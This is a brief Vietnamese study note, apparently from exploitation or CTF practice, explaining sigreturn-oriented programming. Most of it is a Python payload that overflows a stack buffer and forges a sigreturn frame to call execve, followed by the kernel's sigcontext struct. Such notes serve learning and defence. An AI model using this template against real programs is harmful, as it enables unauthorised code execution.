Khi gadget không có đủ các gadget cần thiết mà chỉ có 
pop rax,syscall
thì sử dung sigreturn (syscall 15 )
ví dụ sử dụng 
```python
payload  = b"A" * 64
payload += p64(prev_rbp)
payload += p64(pop_rax_ret)
payload += p64(15)
payload += p64(syscall_ret)

frame = bytearray(248)
frame[104:112] = p64(buffer_start + len(payload) + len(bytes(frame)) + 8)  #rdi
frame[112:120] = p64(0)           # rsi
frame[136:144] = p64(0)           # rdx
frame[144:152] = p64(59)          # rax
frame[160:168] = p64(safe_rsp)    # rsp
frame[168:176] = p64(syscall_ret) # rip
frame[176:184] = p64(0x202)       # eflags
frame[184:192] = p64(0x33)        # csgsfs
```

việc ghi đè sẽ xảy ra khi bạn gửi payload vào stack (tính từ rsp) thì kernel sẽ đọc và đưa vào các thanh ghi 
```c
struct sigcontext {
	__u64				r8;
	__u64				r9;
	__u64				r10;
	__u64				r11;
	__u64				r12;
	__u64				r13;
	__u64				r14;
	__u64				r15;
	__u64				rdi;
	__u64				rsi;
	__u64				rbp;
	__u64				rbx;
	__u64				rdx;
	__u64				rax;
	__u64				rcx;
	__u64				rsp;
	__u64				rip;
	__u64				eflags;		/* RFLAGS */
	__u16				cs;
	__u16				gs;
	__u16				fs;
	union {
		__u16			ss;	/* If UC_SIGCONTEXT_SS */
		__u16			__pad0;	/* Alias name for old (!UC_SIGCONTEXT_SS) user-space */
	};
	__u64				err;
	__u64				trapno;
	__u64				oldmask;
	__u64				cr2;
	struct _fpstate 	*fpstate;	/* Zero when no FPU context */
#  ifdef __ILP32__
	__u32				__fpstate_pad;
#  endif
	__u64				reserved1[8];
};
# endif /* __x86_64__ */
```
